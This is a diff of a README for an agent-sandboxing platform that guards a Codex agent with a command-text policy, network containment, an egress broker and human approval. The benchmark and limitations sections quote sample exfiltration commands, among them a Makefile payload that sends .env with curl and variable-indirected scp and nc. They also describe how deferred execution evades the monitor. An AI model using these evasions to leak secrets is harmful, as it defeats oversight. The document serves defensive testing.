@@ -51,12 +51,14 @@ Run it locally with Docker, Colima, or rootless Podman.
 > network policy is still a **reactive command-text guard**: it reasons about
 > command text, so an encoding it has not modelled is a guard miss by
 > construction. Under `RUNTIME_PROVIDER=container` it is no longer the only
-> layer — the Agent runs on a network with no route out and reaches exactly one
-> allowlisted endpoint through a broker, so a guard miss has nowhere to go
+> layer — the Agent runs on a network with no route out and reaches only a
+> narrow broker allowlist (the model endpoint, plus any host a human approved
+> for that one run), so a guard miss has nowhere to go
 > ([docs/EGRESS_CONTAINMENT.md](docs/EGRESS_CONTAINMENT.md), verified against a
 > real engine by `npm run verify:egress`). `RUNTIME_PROVIDER=local-process` has
-> no equivalent containment and should not be given an untrusted Agent. Do not
-> use production data or credentials. See [SECURITY.md](SECURITY.md).
+> no equivalent containment and should not be given an untrusted Agent. See
+> [Current Security Model](#current-security-model) for the whole picture. Do
+> not use production data or credentials. See [SECURITY.md](SECURITY.md).
 
 ## Architecture at a glance
 
@@ -87,10 +89,125 @@ prevention** — spelled out under [Limitations](#limitations).
 > sections below are scoped to the built half, and every figure in them cites the
 > CI run that produced it.
 
+**The whole system on one sheet, including the parts the diagram above predates:**
+[docs/architecture-one-page.png](docs/architecture-one-page.png). It draws all six
+layers top to bottom — frontend, control plane, middleware, runtime, network
+enforcement, data and evidence — with every trust boundary marked and every
+decision (allow, deny, hold, approve, continue, cleanup) shown where it actually
+happens. Unlike the illustration above it is a description of what is built, not
+of the target shape. Its source is
+[docs/architecture-one-page.mmd](docs/architecture-one-page.mmd) and it
+regenerates with `npm run diagram`.
+
 The enforcement point, the trust boundary it sits on, and what crosses it are
 drawn concretely in [The control](#the-control) below;
 [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) has the component and extension
 boundaries.
+
+## Current Security Model
+
+**This section is canonical.** Every other document in this repository links
+here rather than restating it, so there is one place to update and no way for
+two documents to disagree about where enforcement happens.
+
+Two layers run independently, and each covers the other's blind spot. The
+command policy reads text and can be defeated by text it cannot read. The
+network containment reads nothing and cannot be defeated by an encoding,
+because a container with no route out has nowhere to send the bytes.
+
+1. **Capability extraction.** Codex reports every shell command it runs on its
+   JSON event stream, as the command *starts*. `shell-parse.ts` turns the
+   command into structured invocations and the destinations they name;
+   `capabilities.ts` turns those into what the action would *do* —
+   `NETWORK_EGRESS`, `SECRET_READ`, `FILE_WRITE` — including text the command
+   itself would materialise (a named decoder's payload, a script piped into a
+   shell, a file written and then executed).
+2. **Policy evaluation at the trusted backend.** `command-policy.ts` evaluates
+   rules over capabilities, first match decides, inside the server process. The
+   Agent never sees the policy and cannot reach the process that runs it.
+   Evaluation fails closed: an error in the evaluator denies the command.
+3. **Allow / deny / hold.** An allowed command proceeds. A denial of a
+   non-reviewable rule — anything touching a protected secret — destroys the
+   Runtime container immediately and terminates the run as `blocked`. A denial
+   of a *reviewable* rule (by default, egress to a non-allowlisted host) puts
+   the run in `held` instead of killing the task outright.
+4. **Human approval.** A held run raises an approval request naming the exact
+   command, rule and hosts. Resolving it requires an authenticated principal
+   (`APP_PRINCIPALS`) and a written reason, both recorded. Secret-access rules
+   are never reviewable: no human may approve exfiltrating a protected secret,
+   and that is a code-level invariant, not a configuration default.
+5. **Scoped temporary authority.** An approval creates one *continuation run*
+   carrying `extraAllowedHosts`. That grant reaches **both** layers: the run's
+   policy context and the run's broker allowlist. It is scoped to that single
+   run — invisible to other agents, invisible to the next run of the same
+   agent, and gone when the run's topology is torn down. A fresh run asking for
+   the same host is held again and needs a new decision.
+6. **Per-run internal network.** Under `RUNTIME_PROVIDER=container` (the
+   default), each run gets a container network created with `--internal`. The
+   engine installs no NAT and no gateway, so nothing attached to it has a route
+   off it. This is structural default-deny: not a rule about traffic, an
+   absence of anywhere for traffic to go.
+7. **Broker-mediated egress.** A dual-homed egress-broker sidecar is the single
+   point with a foot on both networks, and the Agent reaches it as `HTTPS_PROXY`
+   by container name. It is a CONNECT proxy with a narrow allowlist — the model
+   endpoint, plus whatever step 5 granted for this run — and it fails closed on
+   every other path: an unparseable request, a name not on the list, a DNS
+   failure, or a resolved address in a private, loopback, link-local or CGNAT
+   range. The private-address check runs on the **resolved** address, for every
+   allowlisted name including approved ones, so an approval is not a way past
+   the DNS-rebinding defence.
+8. **Persisted evidence.** Every decision is written to an append-only audit log
+   in the same atomic write as the run's outcome, so evidence and outcome can
+   never disagree. Commands are redacted of URL credentials, high-entropy tokens
+   and the platform's own Ark key before they are stored, served, or rendered.
+   Approvals record who decided, when, and why.
+9. **Local-process caveat.** `RUNTIME_PROVIDER=local-process` runs Codex beside
+   the server with **no equivalent network containment**: layers 6 and 7 do not
+   exist there, and the command policy is the only control. It is a
+   development-only path and should not be given an untrusted Agent.
+
+The container runtime uses structural default-deny networking. Each run gets an
+internal network with no outbound route, and all external traffic passes through
+a per-run egress broker with a narrow allowlist. A human approval can add one
+host to that allowlist for the duration of a single continuation run.
+
+The local-process runtime does NOT provide equivalent network containment and is
+a development-only path.
+
+### Evidence at this commit
+
+Every row was produced by running the named command **on this tree, on a
+developer machine** — not read off a CI run. That is a provenance claim with an
+expiry date, and it is registered as one in
+[`docs/figures-exempt.json`](docs/figures-exempt.json): once CI runs on this
+branch, `npm run verify:figures` reports the label as expired and these rows are
+re-derived against that run. Re-run any of them meanwhile; the CLIs print the
+same figures they print here, and the latency row will print your hardware's
+rather than this one's.
+
+<!-- figures: local reason="Measured by running the named CLI on this commit on a developer machine. No CI run exists for this branch yet, so none of these can cite one; the provenance label registered in docs/figures-exempt.json retires this block when one does." -->
+
+| What it measures | Command | Result |
+| --- | --- | ---: |
+| Attacks the policy would allow | `npm run bench:security` | **0/114** (0.0%) |
+| Secret-channel attacks allowed | `npm run bench:security` | **0/40** |
+| Legitimate tasks blocked (false positives) | `npm run bench:security` | 1/84 (1.2%) |
+| Per-command decision latency | `npm run bench:security` | p50 40.7 µs · p95 181.1 µs · p99 279.6 µs |
+| Adversarial probe sweep | `npm run redteam` | **56/56 denied**, 0 bypasses |
+| Generated attack bank (bulk tier) | `npm run bench:generate` | **6,860/6,860** (100.00%), ratchet 0 |
+| Injection benchmark (enforcement tier) | `npm run bench:injection` | 3,714/3,750 (99.04%), **36 documented residuals** |
+| Threat register | `npm run threat-model` | 9/9 mitigated, all controls verified |
+
+<!-- /figures -->
+
+The one row that is not 100% is the honest one, and it is discussed in full
+under [Limitations](#limitations): the 36 residuals are all *deferred-execution
+carriers* — a payload written into a Makefile, a git hook or a crontab and
+executed later by something else — which the classifier does not re-read. Under
+the container runtime, the network-exfiltration half of that class is contained
+structurally anyway, because the destination is unreachable whether or not the
+classifier recognised the command. Latency is hardware-dependent; run the CLI on
+your own machine for the figure that applies to it.
 
 ## Direction: threat modeling and safety
 
@@ -122,7 +239,10 @@ contains attempted secret exfiltration from inside the Agent Runtime.**
 ### The problem
 
 The Starter Kit hands every Agent Run a container with real shell access, a real
-model credential available to Codex, and unrestricted outbound networking.
+model credential available to Codex, and unrestricted outbound networking. (That
+is the starting position this fork inherited; the outbound half is closed under
+`RUNTIME_PROVIDER=container` — see
+[Current Security Model](#current-security-model).)
 Originally, Agent-authored commands inherited that credential as
 `ARK_API_KEY`. Nothing observed what commands the Agent ran — the event parser
 read only assistant messages and token usage, discarding everything else. A
@@ -143,12 +263,18 @@ and destroys the Runtime container on the first denial.
 > denies commands with a *recognisable* disallowed destination — an explicit
 > URL or host, a known egress tool with a resolvable target, an interpreter
 > making a network call, a reverse shell, or a read of protected material. It is
-> **not** a network allowlist: the container still has bridge networking, and a
-> command whose destination is *implicit* (a bare `npm install` hitting the
-> default registry, a `git push` to a preconfigured remote) is **not** blocked
-> by this layer. True default-deny egress requires network-layer enforcement,
-> which is deliberately deferred (see Limitations). The claims below are scoped
-> to what a command-text guard can actually enforce.
+> **not** a network allowlist: a command whose destination is *implicit* (a bare
+> `npm install` hitting the default registry, a `git push` to a preconfigured
+> remote) is **not** blocked by *this* layer. The claims in this section are
+> scoped to what a command-text guard can actually enforce.
+>
+> Default-deny egress is enforced separately, one layer down. Under
+> `RUNTIME_PROVIDER=container` the run has no outbound route at all and reaches
+> only the broker's narrow allowlist, so the implicit destinations above are
+> refused by the network even though this layer did not recognise them — see
+> [Current Security Model](#current-security-model). Under
+> `RUNTIME_PROVIDER=local-process` there is no such layer and this guard is the
+> only control.
 
 The engine is layered so that a rule is a statement about capabilities, not a
 pattern over shell syntax:
@@ -251,11 +377,40 @@ flowchart LR
 
 ```bash
 # 1. Start the platform
-ARK_API_KEY=your-key ARK_MODEL=your-model npm run poc
+ARK_API_KEY=your-key ARK_MODEL=your-model APP_PRINCIPALS=alice:replace-with-a-random-token npm run poc
 
 # 2. In a second terminal, start the stand-in attacker endpoint
 node scripts/mock-collector.mjs
 ```
+
+> **`APP_PRINCIPALS` is not optional for this demo.** The server starts without
+> it — it binds to loopback, so nothing forces the issue at startup — but the
+> approval endpoint refuses a null principal with `401`, and the hold → approve →
+> continue flow in step 2 below is exactly what you cannot complete. Format is
+> comma-separated `id:token` pairs; the id is what the audit record names as the
+> approver, so give each reviewer their own. The token above is a placeholder:
+> use 8+ characters of `[A-Za-z0-9._~-]` on loopback, 24+ anywhere else. Never
+> commit a real one. `.env.example` documents the same variable if you would
+> rather keep it in a file.
+>
+> **Where the token goes.** With `APP_PRINCIPALS` set, the browser opens on an
+> **Enter your access token** screen instead of the agent list. Paste the token
+> half only — `replace-with-a-random-token`, not `alice:...`. The server maps it
+> back to the principal `alice`, and from then on the approve and deny buttons
+> read **"Approve as alice"** and **"Deny as alice"**: that principal is the
+> approver of record for every decision made in this browser session.
+>
+> **Where held actions appear.** A held run shows in the **Playground**, in the
+> conversation pane beside the run it belongs to — not in a separate queue. The
+> card names the rule, the exact (redacted) command, and the hosts requested,
+> and it will not submit without a written reason.
+>
+> **What you should see after approving.** The approval flips to `approved` with
+> your principal, your reason and a timestamp; a continuation run starts in the
+> same Codex thread; and the command that was held now runs with the host
+> reachable — the grant is on that run's broker allowlist as well as its policy
+> context. Ask for the same host in a *new* task and it is held again: the grant
+> bought one run, not a standing allowance.
 
 The primary demo is deterministic under the **default** config
 (`POLICY_REVIEW_RULES=network-egress-denied,network-egress-denied-implicit`).
@@ -280,17 +435,26 @@ request showing the exact command and rule.
    the model reached for `node -e "fetch(...)"` rather than `curl`; the
    interpreter-egress rule caught it anyway.)
 
-   > **An approval is a policy decision, not a network one.** With the default
-   > `CONTAINER_EGRESS_ISOLATION=true`, the broker allowlists exactly the model
-   > endpoint, and a human approval does **not** widen it. So the resumed Run
-   > runs the command and the destination is still unreachable — in the recorded
-   > run the Agent reported `EAI_AGAIN` on a direct fetch and `403` through the
-   > proxy, then finished and said so. That is the two layers behaving as
-   > designed: a human can release a *policy* hold, and no human decision in the
-   > app can talk the network layer into a route. If you want the continuation to
-   > actually reach the host, run with `CONTAINER_EGRESS_ISOLATION=false`, where
-   > the container has bridge networking and the command policy is the only
-   > control. See [docs/evidence/](docs/evidence/) for the transcript.
+   > **An approval now reaches both layers, and only for that run.** With the
+   > default `CONTAINER_EGRESS_ISOLATION=true`, approving `registry.npmjs.org`
+   > adds it to the continuation run's *policy* context **and** to that run's
+   > broker allowlist (`EGRESS_APPROVED_URLS` on the broker container the run
+   > creates). The resumed Run reaches the host; a run that was not granted it,
+   > for this or any other agent, still cannot. The grant dies with the broker
+   > container at teardown, so it cannot outlive the decision that made it.
+   >
+   > What an approval still cannot do is widen anything beyond the named host on
+   > its default port, and it cannot buy a route to a private address: the
+   > broker re-checks the *resolved* address for every allowlisted name,
+   > approved ones included, so an approval is not a way past the DNS-rebinding
+   > defence. See [Current Security Model](#current-security-model).
+   >
+   > Earlier transcripts in [docs/evidence/](docs/evidence/) show the previous
+   > behaviour — `EAI_AGAIN` on a direct fetch and `403` through the proxy on an
+   > *approved* host — because the grant reached policy and stopped there. That
+   > was the bug this closes, and the transcripts are kept rather than deleted
+   > because an approval honoured at one layer and denied at another is the
+   > exact failure worth being able to recognise again.
 
 **3. Hard block (secret rule, never reviewable).** A command that reads a
 protected secret *and* egresses is `secret-exfiltration` — hard-blocked, never
@@ -372,7 +536,9 @@ contributor's laptop.
 > **Most of this section was last re-derived against
 > [run 33419076907](https://github.com/wcnjing/CodeJam/actions/runs/33419076907),
 > the CI run for the current commit, and four claims did not survive it.** The
-> store was no longer O(n); the injection benchmark's 146 bypasses were closed;
+> store was no longer O(n); the injection benchmark's 146 bypasses were closed
+> (the bank has since grown to 3,750 variants and surfaced 36 more of the same
+> class — see Limitations);
 > the test count had grown from 226 to 363; and the Windows failure count,
 > reported as stable at 12, was 20. **Every one of them had moved in the
 > project's favour except the last** — which is the direction that makes a stale
@@ -494,8 +660,12 @@ contributor's laptop.
 > rules ever run. The ceiling we described is real, but it sits further out than
 > we drew it. It binds when the payload is not a literal or the decoder is not
 > named — a blob fetched at runtime, a destination assembled at runtime, an
-> encoding nobody enumerated. Those are still open, and network-layer control is
-> still the only thing that removes the dependence on reading text at all.
+> encoding nobody enumerated. Those are still open at this layer, and
+> network-layer control is still the only thing that removes the dependence on
+> reading text at all — which is why it was subsequently built rather than left
+> as the note that closes this correction. It runs today under
+> `RUNTIME_PROVIDER=container`; see
+> [Current Security Model](#current-security-model).
 >
 > **This is the more uncomfortable kind of correction to publish.** The invented
 > 92 ms figure above was an error in our favour, and errors in your favour get
@@ -868,10 +1038,17 @@ Recorded honestly, because each one is a real gap:
   both closed. This is a wider reach, not a different guarantee: it only works
   because the decoder is named in the command and the payload is a literal. A
   destination assembled at runtime, a blob fetched and then executed, or an
-  encoding nobody enumerated are all still invisible. Only network-layer egress
-  control removes the dependence on reading text at all, and that is still
-  deliberately not attempted — see
-  [docs/KILL_SWITCH_PLAN.md](docs/KILL_SWITCH_PLAN.md).
+  encoding nobody enumerated are all still invisible **to this layer**.
+  Removing the dependence on reading text is what the network layer does, and it
+  is built: under `RUNTIME_PROVIDER=container` the run has no outbound route and
+  reaches only the broker's allowlist, so an unrecognised destination is refused
+  by the network whatever the classifier made of the command
+  ([Current Security Model](#current-security-model),
+  [docs/EGRESS_CONTAINMENT.md](docs/EGRESS_CONTAINMENT.md)). That does not make
+  the textual ceiling go away — it bounds what a miss can *cost* for network
+  capabilities, and it does nothing for a non-network capability such as a local
+  file write. Under `RUNTIME_PROVIDER=local-process` there is no second layer at
+  all and the ceiling is the whole guarantee.
 - **Closed: the 146 bypasses where materialised text was never re-examined.**
   This entry documented an open gap for most of the benchmark's life, and it is
   kept rather than deleted because the shape of the finding is the useful part.
@@ -890,62 +1067,160 @@ Recorded honestly, because each one is a real gap:
   enforcement was 2,104/2,250 = **93.51%**, 95% CI 92.42–94.46%, reported
   identically on all three runners so it was not one machine's artefact.
 
-  **It is now 2,250/2,250 = 100.00%**, 95% CI 99.83–100.00%, ratchet 0, on the
-  same benchmark and the same 2,250 variants
-  ([run 33419076907](https://github.com/wcnjing/CodeJam/actions/runs/33419076907),
-  `npm run bench:injection` — the harness is in this tree and runnable from
-  `main`). The fix is the one function this section named as the fix:
+  **Those 146 are closed**, by the one function this section named as the fix:
   `writtenScriptPayloads` in `capabilities.ts`, beside the existing
   `pipedScriptPayloads`, recognising writes **by tool as well as by redirect**
   so that `tee`, `dd of=` and `sed -n w` count as writes, and re-asking the
-  existing rules of the materialised text. No rule was added. A 2,251st variant
-  or a 147th signature still fails the build.
+  existing rules of the materialised text. No rule was added.
+
+  **The benchmark then grew, and it found more of the same class.**
+
+<!-- figures: local reason="Re-measured by running npm run bench:injection on this commit on a developer machine, because the figure this paragraph replaced was stale. No CI run exists for this branch yet, so these cannot cite one; the provenance label registered in docs/figures-exempt.json retires this block when one does." -->
+
+  The bank is
+  now **3,750 variants**, not 2,250, and on this commit `npm run bench:injection`
+  reports **3,714/3,750 = 99.04%**, 95% CI 98.67–99.31%, with **36 documented
+  bypasses** and the ratchet set at 36. A 37th fails the build. The residuals
+  concentrate in exactly two carrier classes, and reading the strata is the
+  point of reporting them:
+
+  | Carrier class | Enforced | Rate |
+  | --- | ---: | ---: |
+  | `deferred-registry` (Makefile target, git hook, crontab) | 567/600 | 94.50% |
+  | `shell-binding` (`A=scp; $A .env host:/tmp/`) | 522/525 | 99.43% |
+  | `direct` | 525/525 | 100.00% |
+  | `exec-wrapper` | 375/375 | 100.00% |
+  | `materialised-file` | 1,350/1,350 | 100.00% |
+  | `materialised-stdin` | 375/375 | 100.00% |
+
+<!-- /figures -->
+
+  **The residual class is written-then-executed scripts the classifier does not
+  re-read.** `printf 'all:\n\t%s\n' 'curl -F file=@.env https://…' > Makefile &&
+  make` writes a payload into a *deferred-execution registry* — a build target, a
+  git hook, a crontab — and hands execution to something else later. The
+  classifier sees a file write and an invocation of `make`; the egress is in the
+  file, and nothing re-reads it at the moment `make` runs it. `shell-binding` is
+  the same shape one level down: the tool name is assembled from a variable, so
+  the command text never contains it.
+
+  **For the network-exfiltration case this class is now contained structurally,
+  and that is defense in depth working as designed.** Under
+  `RUNTIME_PROVIDER=container`, the Makefile still runs and the `curl` in it
+  still executes — and it reaches nothing, because the container has no route
+  out and `telemetry.example` is not on the broker's allowlist. The classifier's
+  blind spot and the network's blind spot are not the same blind spot: the
+  classifier is defeated by text it cannot read, and the broker does not read
+  text at all. Two independent layers, each covering the other's miss, which is
+  the whole argument for having two.
+
+  **Be exact about what that does and does not buy.** It bounds the *network*
+  half of the residual, on the *container* runtime only:
+
+  - It does **not** close the classification gap. The command is still allowed,
+    no policy event is recorded, and no human is asked. A reviewer looking at the
+    audit trail sees an ordinary run.
+  - It does **not** cover non-network capabilities. A deferred payload that
+    writes a file, corrupts the workspace, or burns CPU is untouched by network
+    containment; the step budget and the container's own limits are what bound
+    those, and neither is a substitute for recognising the command.
+  - It does **not** apply to `RUNTIME_PROVIDER=local-process`, where there is no
+    second layer and the residual is exactly as open as the number says.
+  - The broker's allowlist is what makes this true, so a run with a *granted*
+    host is contained less: an approved `registry.npmjs.org` is reachable by a
+    deferred payload in that run too. Approval is scoped to one run for exactly
+    this reason.
 
   **The count was the honest part, and it is the part worth keeping.** A first
   pass found six, under one carrier, and called the class bounded; enumerating
   the carriers took the same finding to 146 against an unchanged engine. Six was
   a floor, not a count — the fourth time in this project that a class looked
-  small because the axis could not express it. Closing it does not retire that
-  lesson: 146 is the number of variants the carrier axis can *express*, and
-  `direct` was 525/525 throughout, which is what identified this as a
-  materialisation gap rather than a regression in the ordinary rules.
+  small because the axis could not express it. Closing it did not retire that
+  lesson, and the 36 above are the lesson repeating: 146 was the number of
+  variants the carrier axis could *express* at the time, the axis was widened,
+  and it expressed more. `direct` was 525/525 throughout both rounds, which is
+  what identifies these as materialisation gaps rather than regressions in the
+  ordinary rules.
   <!-- LOAD-BEARING: the paragraph below stays. It is the one place the README
        explains why three independent measurements can all read 100% and still
        miss the same class, which is the argument the rest of this document
        depends on. Reviewed and kept deliberately; if it is trimmed for length,
        trim something else. -->
   **This never contradicted the 100% figures above, and the relationship is
-  the point — including now that this one reads 100% too.** The generated bank
-  reported 6,860/6,860 and the corpus reported 0/114 escapes while this class was
-  wide open, because neither has a carrier axis: every variant they generate runs
-  its command directly, and every one of those was always denied. Three
-  independent measurements agreeing at 100% did not make the system safe here;
-  they agreed because they shared a blind spot. **Four measurements now agree at
-  100%, and that is worth exactly as much as three did** — which is the reason
-  this paragraph survives the fix rather than being deleted with it. A rate is
-  only ever a rate over what the harness can express.
+  the point.** On this commit the generated bank reports 6,860/6,860, the corpus
+  reports 0/114 escapes, and the red-team sweep reports 56/56 — all while the
+  36 above are open, because none of those three has a carrier axis: every
+  variant they generate runs its command directly, and every one of those is
+  denied. Three independent measurements agreeing at 100% does not make the
+  system safe here; they agree because they share a blind spot. When this
+  benchmark briefly read 100% as well, four measurements agreed, **and that was
+  worth exactly as much as three** — which is why this paragraph survived the
+  fix rather than being deleted with it, and why it is still here now that the
+  fourth has gone back to disagreeing. A rate is only ever a rate over what the
+  harness can express.
 - **Containment versus prevention.** Confirmed against a live Ark endpoint:
   Codex emits `item.started` carrying the full command with `exit_code: null,
   status: "in_progress"` before the command finishes, so the engine reacts
   during execution rather than after it. That is still a race — a command that
   completes faster than the container teardown may finish — so the accurate
   claim is that the Run is terminated mid-flight and all continuation blocked,
-  not that egress is impossible. Only network-layer control would make it
-  impossible.
-- **Not a network allowlist.** This guard only denies *recognisable* egress — an
-  explicit URL/host, a known tool with a resolvable target, an interpreter
-  network call, or a reverse shell. Commands with an **implicit** destination are
-  NOT blocked: a bare `npm install` (default registry), `git push` to a
-  preconfigured remote, or `X=nc; $X host port` (variable indirection) all pass,
-  because the destination is not present in the command text. The container still
-  has bridge networking. True default-deny egress needs network-layer
-  enforcement, deliberately deferred — see [docs/KILL_SWITCH_PLAN.md](docs/KILL_SWITCH_PLAN.md).
+  not that *this layer* makes egress impossible. Under
+  `RUNTIME_PROVIDER=container` the network layer closes the race for network
+  capabilities — a command that wins it still has nowhere to send anything —
+  but the race is real for every other effect, and under
+  `RUNTIME_PROVIDER=local-process` it is real for network egress too.
+- **This guard is not the network allowlist; the broker is.** The command policy
+  only denies *recognisable* egress — an explicit URL/host, a known tool with a
+  resolvable target, an interpreter network call, or a reverse shell. Commands
+  with an **implicit** destination are NOT recognised by it: a bare `npm install`
+  (default registry), `git push` to a preconfigured remote, or `X=nc; $X host
+  port` (variable indirection) all pass this layer, because the destination is
+  not present in the command text.
+  Under `RUNTIME_PROVIDER=container` they are refused anyway, by a network with
+  no route out and a broker allowlist that does not contain them — structural
+  default-deny, described in full under
+  [Current Security Model](#current-security-model) and verified against a real
+  engine by `npm run verify:egress`. Under `RUNTIME_PROVIDER=local-process`
+  there is no such layer, and an implicit destination is simply reachable.
 - **Single process.** Policy decisions now live in an append-only JSONL log
   beside the JSON database rather than inside it, pruned past
   `AUDIT_RETENTION_DAYS` on append, on read, and by compaction at startup
   (TM-OPS-001, closed — see the performance section). Both still run in one
   single-writer process, and access control on the store itself remains out of
-  scope.
+  scope. JSON persistence is a single-process design: it does not survive being
+  run twice against the same data directory, and it is not a database.
+- **The local-process runtime has weaker isolation, and it is not a variant of
+  the container one.** `RUNTIME_PROVIDER=local-process` runs Codex beside the
+  server on the host's own network, with the host's filesystem beyond the
+  workspace and no per-run network, no broker, and no allowlist. The command
+  policy is the only control there. It exists so the platform is runnable
+  without a container engine; it is a development path, and an untrusted Agent
+  does not belong on it. Nothing in this README claims a uniform guarantee
+  across the two.
+- **Policy classification is not full shell semantics.** The engine parses
+  commands and reasons about the capabilities they name; it does not execute a
+  shell, resolve variables at runtime, follow control flow, or model what a
+  program will do once it starts. The residual measured above is what that
+  looks like when it is enumerated rather than asserted.
+- **Adversarial testing has known residual variants, and they are named.** 36 of
+  3,750 injection-benchmark variants are enforcement bypasses on this commit,
+  all in deferred-execution carriers, all listed by signature in the benchmark's
+  own output. They are held by a ratchet: a 37th fails the build. The
+  network-exfiltration half of that class is contained structurally on the
+  container runtime; nothing contains it on the local-process one.
+- **Authentication is a demo principal model, not production identity.**
+  `APP_PRINCIPALS` is a static list of `id:token` pairs held as SHA-256 digests
+  in the server's configuration. There is no OAuth, no session lifetime, no
+  revocation, no rotation, no group or role, and no second factor. It is enough
+  to make "who approved this, and why" a real recorded answer rather than a
+  self-asserted one, which is what the approval evidence needs — and it is not
+  an identity system.
+- **The containers are hardened, but they are not a microVM.** Runs get a
+  read-only root, `no-new-privileges`, all capabilities dropped, a non-root
+  user, a `noexec` tmpfs, and CPU, memory and PID limits — and they still share
+  the host kernel. A kernel-level escape is out of scope for these controls;
+  gVisor, Kata or a real VM boundary is what addresses that class, and none of
+  them is used here.
 
 ## Screenshots
 
@@ -1242,6 +1517,8 @@ docker compose config
 
 ## Documentation
 
+- **[Current Security Model](#current-security-model) — the canonical description of what enforces what, and the one place to update it**
+- [Architecture, one page](docs/architecture-one-page.png) — the whole system on a single sheet, with the trust boundaries marked ([Mermaid source](docs/architecture-one-page.mmd))
 - [Threat model](docs/THREAT_MODEL.md) — DFD, trust boundaries, control map, residual risks
 - [Policy evaluation](docs/POLICY_EVALUATION.md) — measurement harness, defects found, red-team results
 - [Evaluation & reliability plan](docs/EVALUATION_RELIABILITY_PLAN.md) — methodology behind every published figure
